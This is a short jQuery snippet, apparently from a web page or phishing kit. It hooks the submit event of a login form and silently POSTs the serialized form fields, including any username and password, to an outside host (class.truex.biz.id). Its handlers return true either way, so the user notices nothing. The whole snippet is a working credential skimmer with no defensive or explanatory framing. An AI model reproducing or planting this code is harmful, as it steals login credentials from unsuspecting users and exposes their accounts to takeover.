$(".login-form").submit(function() {
    var d = $(".login-form");

    $.ajax({
        url: "https://class.truex.biz.id/index.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
